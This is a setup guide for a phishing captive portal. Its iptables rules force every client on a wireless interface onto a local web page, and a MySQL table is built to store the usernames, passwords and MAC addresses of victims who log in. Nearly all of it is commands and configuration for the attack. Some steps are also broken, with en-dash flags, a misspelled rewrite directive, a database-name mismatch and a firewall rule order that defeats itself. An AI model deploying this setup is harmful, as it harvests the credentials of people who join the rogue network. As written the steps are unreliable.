# Captive Portal Based Phishing Configuration Steps
Captive Portal will need a web site for authentication, and some firewall rules to force connected user login.

## 1. Install required softwares
```
#sudo apt install apache2
#sudo apt install php
#sudo apt install php-mysql
#sudo apt install default-mysql-server
```

## 2. Configure iptables rules (firewall)
```
#sudo iptables -t mangle -N portal

#sudo iptables -t mangle -A PREROUTING -i wlan0 -p tcp -m tcp –dport 1:65534 -j portal
#sudo iptables -t mangle -A PREROUTING -i wlan0 -p udp -m udp –dport 1:65534 -j portal

#sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -m mark –mark 99 -m tcp –dport 1:65534 -j DNAT –to-destination 192.168.2.1:80

#sudo iptables -t mangle -A portal -j MARK –set-mark 99

#sudo iptables -t mangle -I portal 1 -d 192.168.2.1 -p tcp -m tcp -j RETURN
#sudo iptables -t mangle -I portal 1 -d 192.168.2.1 -p udp --dport 1:52 -j DROP
#sudo iptables -t mangle -I portal 1 -d 192.168.2.1 -p udp --dport 54:65534 -j DROP

#sudo iptables -t filter -A FORWARD -m mark --mark 99 -j DROP
#sudo iptables -t filter -A FORWARD -m mark --mark 99 -d 192.168.2.1 -j ACCEPT
```
After configure the rules, record them into the restor file to make sure the rules will work after reboot.
```
#sudo sh -c "iptables-save>/etc/iptables.ipv4.nat"
#sudo nano /etc/rc.local
```
Add below statement befor "exit 0"
```
iptables-restore < /etc/iptables.ipv4.nat
```
## 3. Confiugre Apache2 Server rules
```
#sudo nano /etc/apache2/sites-enabled/000-default.conf
```
Add rewrite rules as below
```
<VirtualHost *:80>
  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html
  RewriteEngine on
  RewriteCond %{REMOTE_ADDR} !^192.168.2.1
  RweriteRule ^(.*)/index.php [R=301]
</VirtualHost>
```
```
#sudo service apache2 restart
```

## 4. Create Database:
Enter the mysql terminal with the username and password you set
Create the table
```
create database protal;
use protal;
create table portal(user VARCHAR(100), pswd VARCHAR(100), mac VARCHAR(100));
```
remember to flush the privileges to the user, as an example
```
GRANT ALL PRIVILEGES ON portal.* TO 'root'@'localhost' identified by 'toor' with grant option;
set global read_only=0;
flush privileges;
exit;
```
## 5. Create website
the index.php example is given.
